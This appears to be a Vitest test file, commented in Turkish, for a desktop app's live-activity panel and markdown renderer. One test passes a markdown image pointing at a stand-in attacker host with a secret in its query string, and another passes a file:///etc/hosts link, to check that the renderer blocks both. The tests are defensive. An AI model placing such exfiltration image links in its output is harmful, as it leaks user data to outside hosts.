import { describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import type { ReactNode } from "react";

import { I18nProvider } from "../i18n";
import { LiveActivity } from "./LiveActivity";
import { MarkdownView } from "./MarkdownView";

const openUrl = vi.fn();
vi.mock("@tauri-apps/plugin-opener", () => ({
  openUrl: (url: string) => openUrl(url),
}));

// LiveActivity useI18n kullanıyor → testte gerçek provider ile sarılır.
function withI18n(ui: ReactNode) {
  return render(<I18nProvider>{ui}</I18nProvider>);
}

describe("LiveActivity", () => {
  it("çalışırken güncel durum metnini gösterir", () => {
    withI18n(<LiveActivity streaming={true} status="🧠 Claude düşünüyor…" log={[]} />);
    expect(screen.getByText("🧠 Claude düşünüyor…")).toBeTruthy();
  });

  it("çalışmıyor + log boşken hiçbir şey render etmez", () => {
    const { container } = withI18n(
      <LiveActivity streaming={false} status={null} log={[]} />,
    );
    expect(container.firstChild).toBeNull();
  });

  it("aktivite log satırlarını gösterir", () => {
    withI18n(<LiveActivity streaming={true} status="x" log={["adım bir", "adım iki"]} />);
    expect(screen.getByText("adım iki")).toBeTruthy();
  });
});

describe("MarkdownView", () => {
  it("markdown'ı zengin HTML'e render eder (başlık/kalın/liste)", () => {
    const { container } = render(
      <MarkdownView text={"# Başlık\n\n**kalın** metin\n\n- a\n- b"} />,
    );
    expect(container.querySelector("h1")?.textContent).toContain("Başlık");
    expect(container.querySelector("strong")?.textContent).toContain("kalın");
    expect(container.querySelectorAll("li").length).toBe(2);
  });

  it("uzak görseli <img> olarak yüklemez; tıklanabilir yer tutucu gösterir", () => {
    const { container } = render(
      <MarkdownView
        text={"cevap\n\n![pixel](https://evil.example/p?d=SECRET) ve ![yerel](./a.png)"}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    const link = container.querySelector('a[href^="https://evil.example"]');
    expect(link?.textContent).toBe("[pixel]");
    expect(screen.getByText("[yerel]").tagName).toBe("SPAN");
  });

  it("göreli/file: linkler webview'ı başka sayfaya götürmez; http(s) dışarıda açılır", () => {
    openUrl.mockReset();
    render(
      <MarkdownView
        text={"[kod](src/indexer.rs) [dosya](file:///etc/hosts) [web](https://example.com) [bölüm](#ozet)"}
      />,
    );
    // fireEvent.click → preventDefault çağrıldıysa false döner.
    expect(fireEvent.click(screen.getByText("kod"))).toBe(false);
    expect(fireEvent.click(screen.getByText("dosya"))).toBe(false);
    expect(fireEvent.click(screen.getByText("web"))).toBe(false);
    expect(openUrl).toHaveBeenCalledTimes(1);
    expect(openUrl).toHaveBeenCalledWith("https://example.com");
    expect(fireEvent.click(screen.getByText("bölüm"))).toBe(true);
  });

  it("kod bloğunu <code> olarak render eder", () => {
    const { container } = render(<MarkdownView text={"`inline kod`"} />);
    expect(container.querySelector("code")?.textContent).toContain("inline kod");
  });
});
